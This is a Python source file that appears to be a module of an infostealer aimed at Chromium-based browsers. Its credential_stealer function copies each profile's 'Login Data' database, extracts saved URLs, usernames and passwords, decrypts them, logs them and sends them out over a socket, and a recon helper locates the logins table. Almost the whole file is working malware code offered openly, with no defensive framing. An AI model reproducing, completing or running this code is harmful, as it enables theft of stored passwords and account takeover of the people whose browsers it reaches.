""" IMPORTS """
import sqlite3

from util.general import (
    try_extract, get_profiles, create_temp_file, log_data,
)
from util.crypt import try_decrypt
from util.socket import socket_send_log


"""
Tables of interest from SQLi Recon:
- logins: contains all the credentials (with encrypted passwords)
    - Columns of interest: action_url, username_value, password_value
"""


@try_extract
def credential_stealer(browser: dict, encryption_key: str) -> None:
    """ Steals credentials from a browser and places them into the logs directory """
    # Examine each profile
    profile_names = get_profiles(browser)
    for profile_name in profile_names:
        # Copy original sqlite3 database to access it without killing any active Chromium processes
        db_path = create_temp_file(browser, profile_name, 'Login Data')

        # Access sqlite3 database
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract encrypted credentials from database
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = cursor.fetchall()

        # Decrypt credentials
        credentials = [
            {
                'url': try_decrypt(url, encryption_key),
                'username': try_decrypt(username, encryption_key),
                'password': try_decrypt(password, encryption_key),
            }
            for url, username, password in data
        ]

        # Logs credentials
        if credentials:
            log_file_name = profile_name + ' Credentials'
            log_data(credentials, browser['name'], log_file_name)
            socket_send_log(credentials, browser['name'], log_file_name)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()



def sqli_recon(db_cursor) -> None:
    """ SQL queries to learn more about the database structure """
    # To find tables
    db_cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
    print(db_cursor.fetchall())
    # Table of interest: logins

    # To find columns for logins table
    db_cursor.execute('PRAGMA table_info(logins)')
    print([row[1] for row in db_cursor.fetchall()])
    # Columns of interest: action_url, username_value, password_value
